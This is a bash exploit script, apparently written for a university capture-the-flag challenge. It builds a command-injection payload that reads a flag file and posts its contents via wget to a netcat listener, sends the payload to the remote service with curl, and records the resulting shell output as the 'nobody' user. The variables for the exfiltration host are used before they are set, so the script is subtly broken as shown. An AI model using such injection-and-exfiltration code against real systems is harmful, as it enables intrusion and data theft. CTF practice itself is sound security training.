#!/bin/bash

# ref
# https://stackoverflow.com/questions/27599839/how-to-wait-for-an-open-port-with-netcat
# https://unix.stackexchange.com/questions/146756/forward-sigterm-to-child-in-bash

_sigint() {
    kill $1
}

_wait_port() {
    while ! nc -z localhost $1; do sleep 0.1; done
}

# remote=http://127.0.0.1:54321/
remote=http://edu-ctf.csie.org:54321/

# --- write the payload --- #

payload_filename="payload"

cmd="cat /home/web/flag"
host="${ip}:${port}"

payload="wget --post-data=\"\`$cmd\`\" http://$host/"

echo $payload > $payload_filename

# --- init server --- #

port=7777

nc -kl $port&
_wait_port $port

nc_pid=$!
trap "_sigint $nc_pid" SIGINT

# --- upload the payload --- #

curl -d @$payload_filename $remote
rm $payload_filename

# --- wait the pid --- #

wait $nc_pid

# pwd
#   /

# whoami
#   nobody

# uname -a
#   Linux 02a2a50aafc0 5.15.0-82-generic #91-Ubuntu SMP Mon Aug 14 14:14:14 UTC 2023 x86_64 Linux
